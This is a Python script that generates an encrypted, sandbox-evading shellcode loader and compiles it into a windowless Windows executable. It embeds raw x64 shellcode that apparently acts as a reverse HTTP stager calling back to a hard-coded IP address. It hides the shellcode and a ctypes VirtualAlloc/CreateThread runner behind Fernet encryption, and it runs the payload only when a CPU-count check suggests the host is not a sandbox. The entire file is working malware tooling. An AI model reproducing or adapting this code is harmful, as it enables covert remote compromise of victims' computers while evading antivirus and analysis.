import os
import random
import sys

from cryptography.fernet import Fernet

key = Fernet.generate_key()
f_obj = Fernet(key)
encodes = b""

# 自己写的一个简单加密算法
def Myencode(f_obj, shellcode):
    return f_obj.encrypt(shellcode)


def Mydecode(f_obj, shellcode):
    return f_obj.decrypt(shellcode)


if __name__ == '__main__':
    shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x15\x1a\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4e\x37\x75\x63\x00\x5a\x66\x32\x94\x7f\x43\xe1\x07\x20\x66\xbc\xdf\x63\xe2\x96\xe2\x61\x5e\xfe\x51\x59\x6d\xc7\x31\x06\xe0\x46\x46\x5f\xf8\xe3\x9f\xdd\xc1\x29\xe9\xb9\xf3\xd8\x7f\x3c\xd6\xbf\x05\xc9\xc6\x62\x17\x6f\xec\x10\x72\x28\x38\x71\x0b\x18\xba\x5a\xf9\x50\x7e\x73\x42\x99\x37\xb0\xc6\x33\x07\x64\x80\xb7\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x54\x50\x3b\x20\x4d\x41\x54\x50\x29\x0d\x0a\x00\x70\x18\xcd\x19\x55\x6f\x07\xec\x48\x81\xba\xcc\x2a\x9f\xb1\x41\xed\xc1\x03\xde\x19\x57\x2a\xcb\xf2\x3a\x2c\xe6\x74\x46\x06\x93\xc3\xcf\xca\x66\x16\xba\x48\x08\xd4\xb0\x9e\x34\xbb\xe6\x7d\xe8\x8b\xc8\x83\xa6\xa4\x77\x52\xec\x74\xf1\xf6\x7c\x2f\x5c\xa8\x04\x12\x44\x1d\x65\xca\xf0\xb4\x01\xa1\xe5\x09\x4b\x3b\x81\x5f\xd9\x2c\xd2\x5e\x1f\x2c\x19\x2c\x23\x43\x23\x1f\x43\x7d\xf3\x23\xb9\xda\x1c\xe5\x09\xf7\x07\x4b\xb9\x0b\x24\x8b\x9f\x3e\xb6\xfd\xda\x81\x72\x3c\x74\x75\x08\x86\xb2\x58\x76\x22\x70\x85\xd8\xb4\xc2\xf8\xbf\x7d\x74\xb0\x33\x3b\x1c\x42\x07\x23\x4e\x82\xfe\xf0\x23\x0b\xd6\x07\xd2\x30\x2f\xd6\x40\xcb\x77\xa8\xdb\x9a\xd2\x6e\x7f\x71\x35\xf6\x79\xf9\x6a\x4a\xd9\x72\x4d\x67\xfe\x91\xe4\x89\xd7\x84\x17\xc6\x0b\x80\x3b\x28\x08\xe3\x36\x18\x00\xd9\x4d\x0d\xfd\x92\x27\x66\x2c\x90\x6d\xe0\x5e\x4c\xe3\x0f\x31\x55\x4e\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x34\x33\x2e\x31\x35\x2e\x32\x34\x34\x00\x00\x01\x86\xa0"

    encodes = Myencode(f_obj, shellcode)

    exec = b"""
shellcode = bytearray(f_obj.decrypt(bytesbuf))
ctypes.windll.kernel32.VirtualAlloc.restype= ctypes.c_uint64
ptr= ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf= (ctypes.c_char *len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
   ctypes.c_uint64(ptr),
   buf,
   ctypes.c_int(len(shellcode))
)
handle= ctypes.windll.kernel32.CreateThread(
   ctypes.c_int(0),
   ctypes.c_int(0),
   ctypes.c_uint64(ptr),
   ctypes.c_int(0),
   ctypes.c_int(0),
   ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))"""

    execcode = f_obj.encrypt(exec)
    exec1 = f"""
import ctypes
import multiprocessing
from cryptography.fernet import Fernet

bytesbuf ={encodes}
execcode={execcode}
f_obj = Fernet({key})
num_cpu = multiprocessing.cpu_count()
# 防沙箱
if num_cpu > 4:
    exec(f_obj.decrypt(execcode))
else:
    sys.exit()
    """
    print(exec1)
    name = random.randint(1, 999999)
    with open(f"{name}.py", "w", encoding="utf-8") as f:
        f.write(exec1)
        f.close()

    os.system(f"pyinstaller -F -w {name}.py")




